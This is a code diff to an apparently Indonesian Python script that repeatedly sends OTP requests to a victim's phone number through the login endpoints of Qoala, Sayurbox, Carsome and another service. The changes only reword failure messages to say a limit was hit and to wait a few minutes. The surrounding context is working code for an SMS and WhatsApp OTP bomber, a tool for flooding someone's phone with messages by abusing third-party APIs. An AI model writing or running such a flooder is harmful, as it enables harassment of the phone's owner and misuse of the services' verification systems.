@@ -154,7 +154,7 @@ for k in range(jumlah):
   else:
     time.sleep(3)
     print(f"{H}____________________________________________")
-    print(f"{M}--> MAAF SMS ECI GAGAL",k)
+    print(f"{M}--> MAAF LIMIT TUNGGU BEBERAPA MENIT LAGI",k)
 for k in range(jumlah):
   k += 1
   pos_qoala = requests.post("https://api.qoalaplus.com/go-agent/v2/otp/+62"+nomer,headers=headers_qoala,data=data_qoala).text
@@ -165,7 +165,7 @@ for k in range(jumlah):
   else:
     time.sleep(3)
     print(f"{H}____________________________________________")
-    print(f"{M}--> MAAF WA QOALA GAGAL",k)
+    print(f"{M}--> MAAF LIMIT TUNGGU BEBERAPA MENIT LAGI",k)
 for k in range(jumlah):
   k += 1
   pos_sayur = requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers=headers_sayur,data=data_sayur).text
@@ -176,7 +176,7 @@ for k in range(jumlah):
   else:
     time.sleep(3)
     print(f"{H}____________________________________________")
-    print(f"{M}--> MAAF WA SAYURBOX GAGAL",k)
+    print(f"{M}--> MAAF LIMIT TUNGGU BEBERAPA MENIT LAGI",k)
 for k in range(jumlah):
   k += 1
   pos_carsome = requests.post("https://www.carsome.id/website/login/sendSMS",headers=headers_carsome,data=data_carsome).text
@@ -187,7 +187,7 @@ for k in range(jumlah):
   else:
     time.sleep(3)
     print(f"{H}____________________________________________")
-    print(f"{M}--> MAAF WA CARSOME GAGAL",k)
+    print(f"{M}--> MAAF LIMIT TUNGGU BEBERAPA MENIT LAGI",k)
     time.sleep(5)
 os.system("clear")
 os.system("python SWS.py")
